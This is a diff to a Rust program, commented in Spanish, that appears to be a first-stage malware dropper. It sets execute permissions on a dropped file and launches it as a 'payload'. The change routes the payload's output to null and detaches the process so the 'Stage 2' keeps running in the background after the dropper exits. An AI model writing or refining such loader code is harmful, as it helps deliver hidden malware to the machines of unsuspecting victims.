@@ -1,6 +1,7 @@
 use std::fs::File;
 use std::io::Write;
 use std::process::Command;
+use std::process::Stdio;
 use std::env;
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
@@ -36,7 +37,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     #[cfg(target_os = "windows")]
     {
         println!("🚀 Ejecutando payload...");
-        Command::new(&path).spawn()?;
+        Command::new(&path)
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+            .spawn()?;
     }
 
     #[cfg(any(target_os = "macos", target_os = "linux"))]
@@ -48,7 +52,12 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         std::fs::set_permissions(&path, perms)?;
 
         println!("🚀 Ejecutando payload...");
-        Command::new(&path).spawn()?;
+
+        // Desvincular el proceso del Stage 1 para que no muera
+        Command::new(&path)
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+            .spawn()?;
     }
 
     println!("✅ Stage 2 ejecutándose en background");
